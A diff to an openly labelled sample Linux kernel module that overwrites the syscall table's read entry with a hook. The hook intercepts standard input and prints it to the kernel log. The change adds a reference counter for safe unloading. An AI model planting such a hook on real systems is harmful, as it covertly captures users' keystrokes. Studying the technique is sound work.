@@ -2,11 +2,14 @@
 #include <linux/unistd.h>
 #include <linux/reboot.h>
 #include "sysmap.h"		// for sys_call_table address this is Device spesific
+#include <asm/atomic.h>
+#include <linux/delay.h>
 
 #define DRIVER_AUTHOR "Moritz Dötterl <moritz.doetterl@tum.de>"
 #define DRIVER_DESC   "A sample kernel module hijacking the read"
 
 int z = 0;
+atomic_t in_original_read;
 
 unsigned long *sys_call_table = (unsigned long*) MAP_sys_call_table; // Address of the Syscall table from sysmap
 
@@ -16,9 +19,11 @@ asmlinkage int hacked_read(unsigned int fd, char __user * buf, size_t count)
 {
 	int i;
 
+	atomic_inc(&in_original_read);
 	if( fd == 0 )		// reading from stdIn
 	{
 		i = original_read(fd, buf, count);
+		printk("ReadCounter: after %d\n",atomic_read(&in_original_read));
 		switch(z) {		// search for input pattern
 			case 0:
 				if(buf[0] == 'f') {
@@ -57,10 +62,15 @@ asmlinkage int hacked_read(unsigned int fd, char __user * buf, size_t count)
 		if(z==0) {
 			printk("Message: %.*s\n", (int)count, buf);		// Print intersected data
 		}
+		atomic_dec(&in_original_read);
 		return i;
 	}
 	else {		// read from anything but StdIn
+		//atomic_inc(&in_original_read);
 		i = original_read(fd, buf, count);
+		//atomic_dec(&in_original_read);
+		//printk("ReadCounter: after %d\n",atomic_read(&in_original_read));
+		atomic_dec(&in_original_read);
 		return i;
 	}
 }
@@ -87,6 +97,7 @@ int make_ro(unsigned long address)
 static int __init init_mod(void)
 {
 	printk("Insert Hock\n");
+	atomic_set(&in_original_read,0);
 	make_rw((unsigned long)sys_call_table);
 	original_read = (void*)*(sys_call_table + __NR_read);
 	*(sys_call_table + __NR_read) = (unsigned long)hacked_read;
@@ -101,6 +112,11 @@ static void __exit  exit_mod(void)
 	make_rw((unsigned long)sys_call_table);
 	*(sys_call_table + __NR_read) = (unsigned long)original_read;
 	make_ro((unsigned long)sys_call_table);
+	if(atomic_read(&in_original_read)!=0) 
+	    printk("waiting for instance to be finished\n");
+	while(atomic_read(&in_original_read)!=0){
+		msleep(10);
+	}
 	printk("hook is not running anymore\n");
 } 
 
